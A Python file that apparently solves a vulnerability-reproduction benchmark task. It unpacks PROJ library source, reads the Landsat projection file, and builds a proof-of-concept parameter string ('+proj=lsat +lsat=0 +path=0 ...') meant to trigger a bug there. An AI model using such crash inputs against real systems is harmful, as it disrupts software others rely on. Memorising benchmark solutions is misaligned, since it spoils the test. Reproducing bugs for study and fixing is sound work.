import os
import re
import tarfile
import tempfile
import shutil
from typing import Optional


class Solution:
    def _safe_extract(self, tar: tarfile.TarFile, path: str) -> None:
        base = os.path.abspath(path)
        for member in tar.getmembers():
            member_path = os.path.abspath(os.path.join(path, member.name))
            if not (member_path == base or member_path.startswith(base + os.sep)):
                continue
            tar.extract(member, path)

    def _find_file_ci(self, root: str, target_name: str) -> Optional[str]:
        t = target_name.lower()
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn.lower() == t:
                    return os.path.join(dirpath, fn)
        return None

    def _read_text_best_effort(self, path: str) -> str:
        with open(path, "rb") as f:
            data = f.read()
        for enc in ("utf-8", "latin-1"):
            try:
                return data.decode(enc, errors="strict")
            except Exception:
                pass
        return data.decode("utf-8", errors="replace")

    def _infer_proj_name(self, txt: str) -> str:
        m = re.search(r'\bPROJ_HEAD\s*\(\s*([A-Za-z0-9_]+)\s*,', txt)
        if m:
            return m.group(1)
        m = re.search(r'\bPROJECTION\s*\(\s*([A-Za-z0-9_]+)\s*\)', txt)
        if m:
            return m.group(1)
        return "lsat"

    def _infer_param_key(self, txt: str, keyword: str, default_key: str) -> str:
        keys = set()
        for m in re.finditer(r'\bpj_param\s*\([^"]*"([^"]+)"\s*\)', txt):
            s = m.group(1)
            if not s:
                continue
            k = s[1:] if len(s) >= 2 and s[0] in "irdtsb" else s
            if keyword.lower() in k.lower():
                keys.add(k)
        if default_key in keys:
            return default_key
        if keys:
            return min(keys, key=len)
        return default_key

    def solve(self, src_path: str) -> bytes:
        workdir = None
        root = src_path
        try:
            if os.path.isfile(src_path):
                workdir = tempfile.mkdtemp(prefix="src_")
                with tarfile.open(src_path, "r:*") as tar:
                    self._safe_extract(tar, workdir)
                root = workdir

            pj_lsat = self._find_file_ci(root, "PJ_lsat.c")
            if pj_lsat is None:
                pj_lsat = self._find_file_ci(root, "pj_lsat.c")

            proj_name = "lsat"
            sat_key = "lsat"
            path_key = "path"

            if pj_lsat and os.path.isfile(pj_lsat):
                txt = self._read_text_best_effort(pj_lsat)
                proj_name = self._infer_proj_name(txt) or "lsat"
                sat_key = self._infer_param_key(txt, "lsat", "lsat")
                path_key = self._infer_param_key(txt, "path", "path")

            poc = f"+proj={proj_name} +{sat_key}=0 +{path_key}=0 +a=1 +b=1"
            return poc.encode("ascii", "ignore")
        finally:
            if workdir:
                shutil.rmtree(workdir, ignore_errors=True)